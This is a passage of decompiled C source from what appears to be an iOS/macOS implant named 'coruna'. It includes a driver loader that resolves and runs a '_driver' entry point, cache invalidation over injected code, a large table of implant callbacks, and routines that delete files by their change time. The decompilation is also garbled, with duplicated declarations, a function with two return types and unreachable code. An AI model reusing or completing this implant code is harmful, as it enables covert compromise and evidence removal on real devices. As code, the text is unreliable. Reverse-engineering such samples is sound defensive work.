    case 1:
    case 4:
      break;
    case 2:
      handle = _CFReadStreamRead(handle,scratch,0x1000);
      if (handle < 1) {
        return;
      }
      err = _CFHTTPMessageAppendBytes(*size_3,scratch,handle);
      if (err != 0) {
        return;
      }
      break;
    case 3:
    case 5:
    case 6:
    case 7:
      break;
    case 8:
      *(uint32_t *)(size_3 + 1) = 0x3008;
      break;
    default:
      if ((port == 0x10) &&
         (handle = _CFReadStreamCopyProperty
                            (handle,*(uint64_t *)k_implant_kcfstreampropertyhttpresponseheader_slot)
         , handle != 0)) {
        u = _CFHTTPMessageGetResponseStatusCode();
        *(uint32_t *)((long)size_3 + 0xc) = u;
        _CFRelease(handle);
      }
    }
  }
  _CFRunLoopGetCurrent();
  _CFRunLoopStop();
switchD_00008fbc_caseD_0:
  return;
}





uint64_t coruna_vsnprintf_alloc(uint64_t *val,int *flags,char *path)
{
  uint u;
  int err;
  char *ptr;
  uint64_t size;
  unsigned long version;
  
  size = 0xad001;
  if (((val != (uint64_t *)0x0) && (flags != (int *)0x0)) && (path != (char *)0x0)) {
    u = _vsnprintf((char *)0x0,0,path,&ghidra_stack_0);
    if ((int)u < 1) {
      ptr = (char *)0x0;
      err = 0;
      size = 0xad014;
    }
    else {
      version = (unsigned long)(u + 1);
      ptr = _malloc(version);
      if (ptr == (char *)0x0) {
        size = 0xad009;
        err = 0;
      }
      else {
        err = _vsnprintf(ptr,version,path,&ghidra_stack_0);
        if ((int)u < err) {
          _bzero(ptr,version);
          _free(ptr);
          ptr = (char *)0x0;
          err = 0;
          size = 0xad00b;
        }
        else {
          size = 0;
          ptr[u] = '\0';
        }
      }
    }
    *val = ptr;
    *flags = err;
  }
  return size;
}





void coruna_sys_icache_invalidate(long handle,long addr_2,uint size)
{
  uint u;
  uint size;
  unsigned long version;
  uint port;
  
  if ((addr_2 == 0) || (size == 0)) {
    size = *(uint *)(handle + 0x90);
    if (size == 0) {
      return;
    }
    addr_2 = *(long *)(handle + 0x88);
  }
  version = 0;
  port = size;
  do {
    size = port - 0x50000;
    if (0x4ffff < port) {
      port = 0x50000;
    }
    _sys_dcache_flush((void *)(addr_2 + version),(unsigned long)port);
    _sys_icache_invalidate((void *)(addr_2 + version),(unsigned long)port);
    u = (int)version + 0x50000;
    version = (unsigned long)u;
    port = size;
  } while (u < size);
  return;
}





uint64_t coruna_bzero_2(long handle,uint size)
{
  uint u;
  long handle;
  uint *ptr;
  uint size;
  uint version;
  char err;
  bool err;
  void *ptr;
  
  version = *(uint *)(handle + 0x90);
  handle = *(long *)(handle + 0x88) + (unsigned long)version;
  ptr = (uint *)(handle + -4);
  if (*(uint **)(handle + 0x138) != (uint *)0x0) {
    ptr = *(uint **)(handle + 0x138);
  }
  do {
    size = *ptr;
    u = size + size + (uint)(size == 0) * 4;
    if (version < u) {
      return 0xc003;
    }
    while (*ptr == size) {
      err = '\x01';
      err = (bool)coruna_ldrex_pass(ptr,0x10);
      if (err) {
        *ptr = u;
        err = coruna_ldrexp_clear();
      }
      if (err == '\0') {
        ptr = (void *)(handle - (unsigned long)u);
        *(void **)(handle + 0x48) = ptr;
        *(uint *)(handle + 0x50) = size;
        _bzero(ptr,(unsigned long)size);
        if (*(void (**)(handle + 0x120) != (void (*)0x0) {
          (**(void (**)(handle + 0x120))
                    (handle,*(uint64_t *)(handle + 0x48),*(uint32_t *)(handle + 0x50));
        }
        return 0;
      }
    }
    ClearExclusiveLocal();
  } while( true );
}





long coruna_surface_dispatch_thunk(long handle,unsigned long arg)
{
  long handle;
  
  if (*(uint *)(handle + 0x50) < arg) {
    handle = 0;
  }
  else {
    handle = *(long *)(handle + 0x48);
    *(unsigned long *)(handle + 0x48) = handle + arg;
    *(uint *)(handle + 0x50) = *(uint *)(handle + 0x50) - (int)arg;
  }
  return handle;
}





uint64_t coruna_bzero(uint64_t val,void *ctx,size_t len)
{
  if ((ctx != (void *)0x0) && (len != 0)) {
    _bzero(ctx,len);
  }
  return 0;
}





uint64_t coruna_bzero_92bc(uint64_t val,void *ctx,size_t len)
{
  _bzero(ctx,len);
  return 0;
}





uint coruna_join_path(char *path,char *str_2,char *name_3,uint size)
{
  char *ptr;
  char *buf;
  int err;
  uint u;
  time_t lt5;
  int *err;
  long handle;
  size_t ls8;
  long addr;
  size_t ls10;
  uint *ptr;
  uint size;
  char scratch [1024];
  stat bootargs;
  
  bootargs.st_gen = 0;
  bootargs.st_lspare = 0;
  bootargs.st_blksize = 0;
  bootargs.st_flags = 0;
  bootargs.st_qspare[1] = 0;
  bootargs.st_qspare[0] = 0;
  bootargs.st_birthtimespec.tv_nsec = 0;
  bootargs.st_birthtimespec.tv_sec = 0;
  bootargs.st_blocks = 0;
  bootargs.st_size = 0;
  bootargs.st_mtimespec.tv_nsec = 0;
  bootargs.st_mtimespec.tv_sec = 0;
  bootargs.st_ctimespec.tv_nsec = 0;
  bootargs.st_ctimespec.tv_sec = 0;
  bootargs.st_rdev = 0;
  bootargs = 0;
  bootargs.st_uid = 0;
  bootargs.st_gid = 0;
  bootargs.st_atimespec.tv_nsec = 0;
  bootargs.st_atimespec.tv_sec = 0;
  bootargs.st_ino = 0;
  bootargs.st_dev = 0;
  bootargs.st_mode = 0;
  bootargs.st_nlink = 0;
  _bzero(scratch,0x400);
  lt5 = _time((time_t *)0x0);
  size = 0xad001;
  if ((path != (char *)0x0) && (*path != '\0')) {
    err = _lstat(path,&bootargs);
    if (err == 0) {
      size = 0xad00b;
      if ((bootargs.st_mode & 0xf000) == 0x4000) {
        _chmod(path,0x1ed);
        bootargs.st_ino = 0;
        bootargs.st_dev = 0;
        bootargs.st_mode = 0;
        bootargs.st_nlink = 0;
        bootargs.st_rdev = 0;
        bootargs = 0;
        bootargs.st_uid = 0;
        bootargs.st_gid = 0;
        bootargs.st_atimespec.tv_nsec = 0;
        bootargs.st_atimespec.tv_sec = 0;
        bootargs.st_mtimespec.tv_nsec = 0;
        bootargs.st_mtimespec.tv_sec = 0;
        bootargs.st_ctimespec.tv_nsec = 0;
        bootargs.st_ctimespec.tv_sec = 0;
        bootargs.st_birthtimespec.tv_nsec = 0;
        bootargs.st_birthtimespec.tv_sec = 0;
        bootargs.st_blocks = 0;
        bootargs.st_size = 0;
        bootargs.st_gen = 0;
        bootargs.st_lspare = 0;
        bootargs.st_blksize = 0;
        bootargs.st_flags = 0;
        bootargs.st_qspare[1] = 0;
        bootargs.st_qspare[0] = 0;
        handle = _opendir(path);
        if (handle != 0) {
          ls8 = _strlen(path);
          buf = "%s%s";
          if (path[ls8 - 1] != '/') {
            buf = "%s/%s";
          }
          err = ___error();
          *err = 0;
          addr = _readdir(handle);
          if (addr == 0) {
            size = 0;
          }
          else {
            size = 0;
            do {
              ptr = (char *)(addr + 0x15);
              err = _strcmp(ptr,"..");
              u = size;
              if ((err != 0) && (err = _strcmp(ptr,"."), err != 0)) {
                u = _snprintf(scratch,0x400,buf);
                if (u == 0xffffffff) {
                  err = ___error();
                  err = *err;
                  ptr = (uint *)___error();
                  u = -*ptr;
                  if (-1 < err) {
                    u = *ptr;
                  }
                  u = u | 0x40000000;
                }
                else if (u < 0x400) {
                  err = _lstat(scratch,&bootargs);
                  u = 0xad00b;
                  if (err == 0) {
                    if ((bootargs.st_mode & 0xf000) == 0x4000) {
                      u = 0;
                      if ((*ptr != '\0') && (*ptr != '.')) {
                        u = coruna_join_path(scratch,str_2,name_3,size);
                      }
                    }
                    else {
                      if (str_2 == (char *)0x0) {
fail:
                        if (name_3 != (char *)0x0) {
                          ls8 = _strlen(ptr);
                          ls10 = _strlen(name_3);
                          if ((ls8 < ls10) ||
                             (err = _strncmp((char *)(addr + (ls8 - ls10) + 0x15),name_3,
                                               ls10), err != 0)) goto done;
                        }
                        if ((size == 0) ||
                           ((lt5 <= bootargs.st_ctimespec.tv_sec ||
                            (lt5 - bootargs.st_ctimespec.tv_sec <= (long)(unsigned long)size)))) {
                          u = 0xad001;
                          if (scratch[0] != '\0') {
                            err = _unlink(scratch);
                            if ((err == 0) || (err = ___error(), *err == 2))
                            goto done;
                            err = ___error();
                            err = *err;
                            ptr = (uint *)___error();
                            u = -*ptr;
                            if (-1 < err) {
                              u = *ptr;
                            }
                            u = u | 0x40000000;
                          }
                          goto cleanup;
                        }
                      }
                      else {
                        ls8 = _strlen(ptr);
                        ls10 = _strlen(str_2);
                        if ((ls10 <= ls8) &&
                           (err = _strncmp(ptr,str_2,ls10), err == 0)) goto fail;
                      }
done:
                      u = 0;
                    }
                  }
cleanup:
                  bootargs.st_gen = 0;
                  bootargs.st_lspare = 0;
                  bootargs.st_blksize = 0;
                  bootargs.st_flags = 0;
                  bootargs.st_qspare[1] = 0;
                  bootargs.st_qspare[0] = 0;
                  bootargs.st_birthtimespec.tv_nsec = 0;
                  bootargs.st_birthtimespec.tv_sec = 0;
                  bootargs.st_blocks = 0;
                  bootargs.st_size = 0;
                  bootargs.st_mtimespec.tv_nsec = 0;
                  bootargs.st_mtimespec.tv_sec = 0;
                  bootargs.st_ctimespec.tv_nsec = 0;
                  bootargs.st_ctimespec.tv_sec = 0;
                  bootargs.st_rdev = 0;
                  bootargs = 0;
                  bootargs.st_uid = 0;
                  bootargs.st_gid = 0;
                  bootargs.st_atimespec.tv_nsec = 0;
                  bootargs.st_atimespec.tv_sec = 0;
                  bootargs.st_ino = 0;
                  bootargs.st_dev = 0;
                  bootargs.st_mode = 0;
                  bootargs.st_nlink = 0;
                }
                else {
                  u = 0xad00c;
                }
                _bzero(scratch,0x400);
                if (size != 0) {
                  u = size;
                }
              }
              size = u;
              err = ___error();
              *err = 0;
              addr = _readdir(handle);
            } while (addr != 0);
          }
          err = ___error();
          if (*err != 0) {
            err = ___error();
            err = *err;
            ptr = (uint *)___error();
            size = -*ptr;
            if (-1 < err) {
              size = *ptr;
            }
            size = size | 0x40000000;
          }
          err = _closedir(handle);
          if (err != 0) {
            size = 0xad00b;
          }
        }
      }
    }
    else {
      err = ___error();
      if (*err == 2) {
        size = 0;
      }
      else {
        err = ___error();
        err = *err;
        ptr = (uint *)___error();
        size = -*ptr;
        if (-1 < err) {
          size = *ptr;
        }
        size = size | 0x40000000;
      }
    }
  }
  return size;
}





uint64_t coruna_closedir(char *path,uint size)
{
  size_t ls1;
  char err;
  int err;
  time_t lt4;
  long handle;
  size_t ls6;
  long addr;
  char *ptr;
  size_t ls9;
  char *buf;
  uint64_t u;
  stat scratch;
  
  u = 0xad001;
  lt4 = _time((time_t *)0x0);
  if ((path != (char *)0x0) && (*path != '\0' && size != 0)) {
    handle = _opendir(path);
    if (handle == 0) {
      u = 0xad00b;
    }
    else {
      ls6 = _strlen(path);
      err = path[ls6 - 1];
      ls1 = ls6;
      if (err != '/') {
        ls1 = ls6 + 1;
      }
      addr = _readdir(handle);
      if (addr != 0) {
        do {
          if (*(char *)(addr + 0x14) == '\b') {
            ptr = _calloc(ls1 + 1 + (unsigned long)*(ushort *)(addr + 0x12),1);
            if (ptr == (char *)0x0) {
              _readdir(handle);
              u = 0xad009;
              goto fail;
            }
            scratch.st_gen = 0;
            scratch.st_lspare = 0;
            scratch.st_blksize = 0;
            scratch.st_flags = 0;
            scratch.st_qspare[1] = 0;
            scratch.st_qspare[0] = 0;
            scratch.st_birthtimespec.tv_nsec = 0;
            scratch.st_birthtimespec.tv_sec = 0;
            scratch.st_blocks = 0;
            scratch.st_size = 0;
            scratch.st_mtimespec.tv_nsec = 0;
            scratch.st_mtimespec.tv_sec = 0;
            scratch.st_ctimespec.tv_nsec = 0;
            scratch.st_ctimespec.tv_sec = 0;
            scratch.st_rdev = 0;
            scratch = 0;
            scratch.st_uid = 0;
            scratch.st_gid = 0;
            scratch.st_atimespec.tv_nsec = 0;
            scratch.st_atimespec.tv_sec = 0;
            scratch.st_ino = 0;
            scratch.st_dev = 0;
            scratch.st_mode = 0;
            scratch.st_nlink = 0;
            _strncpy(ptr,path,ls6);
            if (err != '/') {
              ls9 = _strlen(ptr);
              (ptr + ls9)[0] = '/';
              (ptr + ls9)[1] = '\0';
            }
            buf = _strcat(ptr,(char *)(addr + 0x15));
            err = _stat(buf,&scratch);
            if ((err == 0) &&
               ((lt4 <= scratch.st_ctimespec.tv_sec ||
                (lt4 - scratch.st_ctimespec.tv_sec <= (long)(unsigned long)size)))) {
              _unlink(ptr);
            }
            ls9 = _strlen(ptr);
            _bzero(ptr,ls9);
            _free(ptr);
          }
          addr = _readdir(handle);
        } while (addr != 0);
      }
      u = 0;
fail:
      _closedir(handle);
    }
  }
  return u;
}





unsigned long coruna_run_driver(long *arg,long val,uint64_t n,uint64_t *m)

{
  long *ptr;
  uint size;
  uint type_id_8;
  unsigned long version;
  char *str;
  size_t ls6;
  short *lps7;
  unsigned long type_id_13;
  uint64_t type_id;
  long *buf;
  uint64_t *thread_attr;
  long host_info;
  void (*serial_buf)(void);
  uint32_t cache_37;
  long block_ctx;
  
  thread_attr = (uint64_t *)0x0;
  host_info = 0;
  type_id_13 = 0xad001;
  if ((arg == (long *)0x0) || (val == 0)) {
    return 0xad001;
  }
  version = coruna_implant65fc_residual_88(&host_info,&thread_attr);
  if ((int)version != 0) {
    return version;
  }
  version = coruna_implant65fc_via_ipc_resolve_entry(thread_attr,val);
  if ((int)version != 0) {
    coruna_ctx_free_9e78(host_info);
    return version;
  }
  if (*(char **)(val + 0x78) == (char *)0x0) {
    version = 0;
  }
  else {
    str = _strdup(*(char **)(val + 0x78));
    thread_attr[7] = str;
    version = 0;
    if (str != (char *)0x0) {
      type_id = *thread_attr;
      ls6 = _strlen(str);
      type_id_8 = coruna_pthread_rwlock_unlock(type_id,0x70003,str,(int)ls6 + 1);
      size = 0;
      if (type_id_8 != 0x700a) {
        size = type_id_8;
      }
      version = (unsigned long)size;
    }
  }
  {
    int do_reg = 0;
    if (*(char **)(val + 0xa0) == (char *)0x0) {
      do_reg = ((int)version == 0);
    }
    else {
      str = _strdup(*(char **)(val + 0xa0));
      thread_attr[9] = str;
      if (str == (char *)0x0) {
        do_reg = ((int)version == 0);
      }
      else {
        type_id = *thread_attr;
        ls6 = _strlen(str);
        version = coruna_pthread_rwlock_unlock(type_id,0x70004,str,(int)ls6 + 1);
        if ((int)version == 0x700a) {
          do_reg = 1;
        }
        else {
          do_reg = ((int)version == 0);
        }
      }
    }
    if (do_reg) {
    *(uint8_t *)(thread_attr + 8) = *(uint8_t *)(val + 0x5c0);
    if ((((host_info != 0) && (buf = *(long **)(host_info + 8), buf != (long *)0x0)) &&
        (*(long *)(val + 0x30) != 0)) &&
       ((*(long *)(val + 0x38) != 0 && (*(long *)(val + 0x130) != 0)))) {
      block_ctx = 0;
      cache_37 = 0;
      type_id_13 = (**(void (**)(*buf + 0x18))(*buf,0x90000,&block_ctx,&cache_37);
      if ((int)type_id_13 == 0) {
        ptr = buf + 2;
        type_id_13 = (**(void (**)(val + 0x30))(val,block_ctx,cache_37,ptr);
        if ((int)type_id_13 == 0) {
          serial_buf = (void (*)0x0;
          if (*(void (**)(val + 0x120) != (void (*)0x0) {
            (**(void (**)(val + 0x120))
                      (val,*(uint64_t *)(*ptr + 0x58),*(uint32_t *)(*ptr + 0xa8));
          }
          type_id_13 = (**(void (**)(val + 0x38))(val,*ptr,"_driver",&serial_buf);
          if ((int)type_id_13 == 0) {
            buf = buf + 3;
            type_id_13 = (*serial_buf)(buf);
            if ((int)type_id_13 == 0) {
              lps7 = (short *)*buf;
              if (((lps7 != (short *)0x0) && (*lps7 == 2)) && (1 < (ushort)lps7[1])) {
                type_id_13 = (**(void (**)(thread_attr[3] + 0x18))(thread_attr[3],0,thread_attr + 4);
                if ((int)type_id_13 == 0) {
                  block_ctx = coruna_u64_pack71((block_ctx), (1));
                  if ((*(char *)(val + 0x5c1) != '\0') && (*(char *)(val + 0x5c4) != '\0'))
                  {
                    block_ctx = (unsigned long)block_ctx << 8;
                  }
                  type_id_13 = coruna_implant65fc_via_ctx_free_18dac(thread_attr + 1,thread_attr[3],thread_attr[4],*thread_attr,&block_ctx,
                                       n);
                  if ((int)type_id_13 == 0) {
                    *arg = host_info;
                    if (m != (uint64_t *)0x0) {
                      *m = thread_attr[4];
                    }
                    return 0;
                  }
                  if (thread_attr[4] != 0) {
                    (**(void (**)(thread_attr[3] + 0x20))();
                    thread_attr[4] = 0;
                  }
                }
                coruna_implant65fc_residual_89(host_info,val);
              }
              else {
              *buf = 0;
              type_id_13 = 0xad00a;
              }
            }
          }
          (**(void (**)(val + 0x130))(val,*ptr);
          *ptr = 0;
        }
      }
    }
    }
load_ok_25:
    str = (char *)thread_attr[7];
    if (str != (char *)0x0) {
      ls6 = _strlen(str);
      _bzero(str,ls6);
      _free((void *)thread_attr[7]);
      thread_attr[7] = 0;
    }
    str = (char *)thread_attr[9];
    version = type_id_13;
    if (str != (char *)0x0) {
      ls6 = _strlen(str);
      _bzero(str,ls6);
      _free((void *)thread_attr[9]);
      thread_attr[9] = 0;
    }
    coruna_ctx_free_1c8fc(*thread_attr);
    *thread_attr = 0;
  }
  coruna_ctx_free_9e78(host_info);
  return version;
}





uint64_t coruna_implant65fc_residual_88(uint64_t *val,uint64_t *id_2)
{
  uint64_t u;
  uint32_t *ptr;
  void *ptr;
  
  u = 0xad001;
  if ((val != (uint64_t *)0x0) && (id_2 != (uint64_t *)0x0)) {
    ptr = _calloc(1,0x140);
    if (ptr != (uint32_t *)0x0) {
      ptr = _calloc(1,0x50);
      if (ptr != (void *)0x0) {
        *ptr = 0x60004;
        *(void **)(ptr + 2) = ptr;
        ((void (**)(void *, long, uint64_t))(ptr + 4))[0] = coruna_implant65fc_via_run_starti;
        ((void (**)(void *, long, uint64_t))(ptr + 6))[0] = coruna_implant65fc_via_run_starti_2;
        ((void (**)(void *, long, uint64_t))(ptr + 8))[0] = coruna_implant_residual_47;
        ((void (**)(void *, long, uint64_t))(ptr + 10))[0] = coruna_getcwd;
        ((void (**)(void *, long, uint64_t))(ptr + 0xc))[0] = coruna_implant_via_run_starti_3;
        ((void (**)(void *, long, uint64_t))(ptr + 0xe))[0] = coruna_implant65fc_via_run_starti_3;
        ((void (**)(void *, long, uint64_t))(ptr + 0x10))[0] = coruna_implant65fc_via_run_starti_4;
        ((void (**)(void *, long, uint64_t))(ptr + 0x12))[0] = coruna_implant_via_run_starti_6;
        ((void (**)(void *, long, uint64_t))(ptr + 0x14))[0] = coruna_implant_residual_48;
        ((void (**)(void *, long, uint64_t))(ptr + 0x16))[0] = coruna_implant_residual_49;
        ((void (**)(void *, long, uint64_t))(ptr + 0x18))[0] = coruna_implant65fc_residual_91;
        ((void (**)(void *, long, uint64_t))(ptr + 0x1a))[0] = coruna_implant_residual_50;
        ((void (**)(void *, long, uint64_t))(ptr + 0x1c))[0] = coruna_implant_residual_52;
        ((void (**)(void *, long, uint64_t))(ptr + 0x1e))[0] = coruna_implant_residual_53;
        ((void (**)(void *, long, uint64_t))(ptr + 0x20))[0] = coruna_implant_residual_54;
        ((void (**)(void *, long, uint64_t))(ptr + 0x22))[0] = coruna_implant_residual_55;
        ((void (**)(void *, long, uint64_t))(ptr + 0x24))[0] = coruna_implant65fc_residual_93;
        ((void (**)(void *, long, uint64_t))(ptr + 0x46))[0] = coruna_implant65fc_residual_95;
        ((void (**)(void *, long, uint64_t))(ptr + 0x48))[0] = coruna_implant_residual_51;
        ((void (**)(void *, long, uint64_t))(ptr + 0x26))[0] = coruna_implant65fc_residual_94;
        ((void (**)(void *, long, uint64_t))(ptr + 0x28))[0] = coruna_parse_xnu_processors;
        ((void (**)(void *, long, uint64_t))(ptr + 0x2a))[0] = coruna_strncpy;
        ((void (**)(void *, long, uint64_t))(ptr + 0x2c))[0] = coruna_bzero_b1e0;
        ((void (**)(void *, long, uint64_t))(ptr + 0x4a))[0] = coruna_strncpy_2;
        ((void (**)(void *, long, uint64_t))(ptr + 0x4c))[0] = coruna_bzero_b2fc;
        ((void (**)(void *, long, uint64_t))(ptr + 0x2e))[0] = coruna_implant_residual_56;
        ((void (**)(void *, long, uint64_t))(ptr + 0x30))[0] = coruna_implant_residual_57;
        ((void (**)(void *, long, uint64_t))(ptr + 0x32))[0] = coruna_run_startm;
        ((void (**)(void *, long, uint64_t))(ptr + 0x34))[0] = coruna_csops;
        ((void (**)(void *, long, uint64_t))(ptr + 0x36))[0] = coruna_implant65fc_via_closedir_bd88;
        ((void (**)(void *, long, uint64_t))(ptr + 0x38))[0] = coruna_implant65fc_residual_92;
        ((void (**)(void *, long, uint64_t))(ptr + 0x3a))[0] = coruna_implant65fc_residual_96;
        ((void (**)(void *, long, uint64_t))(ptr + 0x3c))[0] = coruna_implant65fc_residual_97;
        ((void (**)(void *, long, uint64_t))(ptr + 0x3e))[0] = coruna_implant65fc_residual_98;
        ((void (**)(void *, long, uint64_t))(ptr + 0x40))[0] = coruna_implant65fc_residual_99;
        ((void (**)(void *, long, uint64_t))(ptr + 0x42))[0] = coruna_implant_residual_61;
        ((void (**)(void *, long, uint64_t))(ptr + 0x44))[0] = coruna_implant_via_host_get_special_port;
        ((void (**)(void *, long, uint64_t))(ptr + 0x4e))[0] = coruna_implant_residual_62;
        *val = ptr;
        *id_2 = ptr;
        return 0;
      }
      _free(ptr);
    }
    u = 0xad009;
  }
  return u;
}





unsigned long coruna_implant65fc_residual_89(long arg,long val)

{
  uint u;
  unsigned long size;
  long off;
  
  size = 0xad001;
  if (((arg != 0) && (off = *(long *)(arg + 8), off != 0 && val != 0)) &&
     (*(long *)(val + 0x130) != 0)) {
    if (*(long *)(off + 0x18) == 0) {
      size = 0;
    }
    else {
      size = (**(void (**)(*(long *)(off + 0x18) + 0x10))();
      *(uint64_t *)(off + 0x18) = 0;
    }
    if (*(long *)(off + 0x10) != 0) {
      u = (**(void (**)(val + 0x130))(val);
      if ((uint)size != 0) {
        u = (uint)size;
      }
      size = (unsigned long)u;
      *(uint64_t *)(off + 0x10) = 0;
    }
  }
  return size;
}





uint64_t coruna_ctx_free_9e78(uint64_t *val)
{
  size_t ls1;
  uint64_t *ptr;
  char *ptr;
  
  if (val != (uint64_t *)0x0) {
    ptr = (uint64_t *)val[1];
    if (ptr != (uint64_t *)0x0) {
      ptr = (char *)ptr[7];
      if (ptr != (char *)0x0) {
        ls1 = _strlen(ptr);
        _bzero(ptr,ls1);
        _free((void *)ptr[7]);
      }
      ptr = (char *)ptr[9];
      if (ptr != (char *)0x0) {
        ls1 = _strlen(ptr);
        _bzero(ptr,ls1);
        _free((void *)ptr[9]);
      }
      ptr[7] = 0;
      ptr[6] = 0;
      ptr[9] = 0;
      ptr[8] = 0;
      ptr[3] = 0;
      ptr[2] = 0;
      ptr[5] = 0;
      ptr[4] = 0;
      ptr[1] = 0;
      *ptr = 0;
      _free(ptr);
    }
    val[0x25] = 0;
    val[0x24] = 0;
    val[0x27] = 0;
    val[0x26] = 0;
    val[0x21] = 0;
    val[0x20] = 0;
    val[0x23] = 0;
    val[0x22] = 0;
    val[0x1d] = 0;
    val[0x1c] = 0;
    val[0x1f] = 0;
    val[0x1e] = 0;
    val[0x19] = 0;
    val[0x18] = 0;
    val[0x1b] = 0;
    val[0x1a] = 0;
    val[0x15] = 0;
    val[0x14] = 0;
    val[0x17] = 0;
    val[0x16] = 0;
    val[0x11] = 0;
    val[0x10] = 0;
    val[0x13] = 0;
    val[0x12] = 0;
    val[0xd] = 0;
    val[0xc] = 0;
    val[0xf] = 0;
    val[0xe] = 0;
    val[9] = 0;
    val[8] = 0;
    val[0xb] = 0;
    val[10] = 0;
    val[5] = 0;
    val[4] = 0;
    val[7] = 0;
    val[6] = 0;
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    _free(val);
    return 0;
  }
  return 0xad001;
}





int coruna_implant65fc_via_ctx_free_9e78(long handle,long addr_2)
{
  int err;
  int status;
  uint64_t *ptr;
  
  status = 0xad001;
  if ((handle != 0) &&
     (ptr = *(uint64_t **)(handle + 8), ptr != (uint64_t *)0x0 && addr_2 != 0)) {
    err = coruna_implant65fc_residual_90(handle);
    status = (**(void (**)(ptr[1] + 0x20))();
    if (err != 0) {
      status = err;
    }
    if (ptr[4] != 0) {
      err = (**(void (**)(ptr[3] + 0x30))();
      if (status != 0) {
        err = status;
      }
      status = (**(void (**)(ptr[3] + 0x20))(ptr[3],ptr[4]);
      if (err != 0) {
        status = err;
      }
    }
    err = coruna_implant65fc_residual_89(handle,addr_2);
    if (status != 0) {
      err = status;
    }
    status = (**(void (**)(ptr[1] + 0x10))();
    if (err != 0) {
      status = err;
    }
    err = coruna_ctx_free_1c8fc(*ptr);
    if (status != 0) {
      err = status;
    }
    status = coruna_ctx_free_9e78(handle);
    if (err != 0) {
      status = err;
    }
  }
  return status;
}





unsigned long coruna_implant65fc_residual_90(long arg)

{
  uint u;
  unsigned long size;
  long off;
  
  size = 0xad001;
  if ((arg != 0) && (off = *(long *)(arg + 8), off != 0)) {
    if (*(long *)(off + 0x30) == 0) {
      size = 0;
    }
    else {
      size = (**(void (**)(*(long *)(off + 0x30) + 0x10))();
      *(uint64_t *)(off + 0x30) = 0;
    }
    if (*(long *)(off + 0x28) != 0) {
      u = (**(void (**)(arg + 0x60))(arg);
      if ((uint)size != 0) {
        u = (uint)size;
      }
      size = (unsigned long)u;
      *(uint64_t *)(off + 0x28) = 0;
    }
  }
  return size;
}





uint64_t
void coruna_strdup_2(uint64_t *val,short *arg,short *arg,short *val,char *path,
            char *str_2)
{
  uint64_t *ptr;
  char *ptr;
  uint64_t u;
  uint64_t *scratch;
  uint64_t bootargs;
  
  u = 0xad001;
  if ((((((val != (uint64_t *)0x0) && (arg != (short *)0x0)) && (*arg == 1)) &&
       ((arg[1] != 0 && (arg != (short *)0x0)))) &&
      ((*arg == 2 && ((1 < (ushort)arg[1] && (val != (short *)0x0)))))) &&
     ((*val == 3 && (val[1] != 0)))) {
    scratch = (uint64_t *)0x0;
    bootargs = 0;
    u = coruna_implant65fc_residual_88(&bootargs,&scratch);
    ptr = scratch;
    if ((int)u == 0) {
      *scratch = arg;
      scratch[1] = val;
      scratch[3] = arg;
      if (path != (char *)0x0) {
        ptr = _strdup(path);
        ptr[7] = ptr;
      }
      if (str_2 != (char *)0x0) {
        ptr = _strdup(str_2);
        ptr[9] = ptr;
      }
      *val = bootargs;
    }
  }
  return u;
}





int coruna_implant65fc_via_ctx_free_9e78_2(long handle)
{
  int err;
  int status;
  long handle;
  long addr;
  
  status = 0xad001;
  if ((handle != 0) && (addr = *(long *)(handle + 8), addr != 0)) {
    err = coruna_implant65fc_residual_90(handle);
    handle = *(long *)(addr + 0x18);
    if ((handle != 0) &&
       (((*(void (**)(handle + 0x30) != (void (*)0x0 && (*(long *)(handle + 0x20) != 0)) &&
        (*(long *)(addr + 0x20) != 0)))) {
      status = (**(void (**)(handle + 0x30))();
      if (err != 0) {
        status = err;
      }
      err = (**(void (**)(*(long *)(addr + 0x18) + 0x20))
                        (*(long *)(addr + 0x18),*(uint64_t *)(addr + 0x20));
      if (status != 0) {
        err = status;
      }
    }
    status = coruna_ctx_free_9e78(handle);
    if (err != 0) {
      status = err;
    }
  }
  return status;
}





unsigned long coruna_bzero_3(uint64_t *arg,short *val,long n,uint64_t m,char *p,
                  char *q)

{
  uint u;
  uint size;
  int flags;
  unsigned long version;
  char *str;
  size_t ls6;
  uint64_t kind;
  char cache_38 [3];
  uint work;
  uint8_t thread_attr[8];
  uint64_t *host_info;
  uint64_t serial_buf;
  
  if (arg == (uint64_t *)0x0) {
    return 0xad001;
  }
  if (val == (short *)0x0) {
    return 0xad001;
  }
  if (*val != 2) {
    return 0xad001;
  }
  if (((ushort)val[1] < 2 || n == 0) || (int)m == 0) {
    return 0xad001;
  }
  host_info = (uint64_t *)0x0;
  serial_buf = 0;
  version = coruna_implant65fc_residual_88(&serial_buf,&host_info);
  if ((int)version != 0) {
    return version;
  }
  host_info[3] = val;
  version = coruna_implant65fc_via_ctx_free_1c8fc(host_info,n,m);
  coruna_ctx_free_9e78(serial_buf);
  return version;
  if (p != (char *)0x0) {
    str = _strdup(p);
    host_info[7] = str;
  }
  if (q != (char *)0x0) {
    str = _strdup(q);
    host_info[9] = str;
  }
  str = (char *)host_info[7];
  version = 0;
  if (str != (char *)0x0) {
    kind = *host_info;
    ls6 = _strlen(str);
    size = coruna_pthread_rwlock_unlock(kind,0x70003,str,(int)ls6 + 1);
    u = 0;
    if (size != 0x700a) {
      u = size;
    }
    version = (unsigned long)u;
  }
  str = (char *)host_info[9];
  if (str == (char *)0x0) {
load_ok_27:
    thread_attr[0] = 1;
    work = 0;
    cache_38[1] = '\0';
    cache_38[2] = '\0';
    version = coruna_mach_vm_region_recurse(*(uint32_t *)k_implant_mach_task_self_slot);
    if ((int)version == 0) {
    if ((work & 7) != 0) {
    cache_38[0] = '\0';
    flags = coruna_implant65fc_via_identity_6080(cache_38);
    if (flags != 0) {
    version = 0xad00b;
    if ((int)version == 0) {
    return version;
    }
    str = (char *)host_info[7];
    if (str != (char *)0x0) {
    ls6 = _strlen(str);
    _bzero(str,ls6);
    _free((void *)host_info[7]);
    host_info[7] = 0;
    }
    str = (char *)host_info[9];
    if (str != (char *)0x0) {
    ls6 = _strlen(str);
    _bzero(str,ls6);
    _free((void *)host_info[9]);
    host_info[9] = 0;
    }
    coruna_ctx_free_1c8fc(*host_info);
    *host_info = 0;
    coruna_ctx_free_9e78(serial_buf);
    return version;
    }
    if (cache_38[0] != '\0') {
    thread_attr[0] = 0;
    }
    }
    version = coruna_implant65fc_via_ctx_free_18dac(host_info + 1,host_info[3],0,*host_info,thread_attr,1);
    if ((int)version == 0) {
    *arg = serial_buf;
    }
    }
    }
    load_ok_29:
    if ((int)version == 0) {
    return version;
  }
  else {
    kind = *host_info;
    ls6 = _strlen(str);
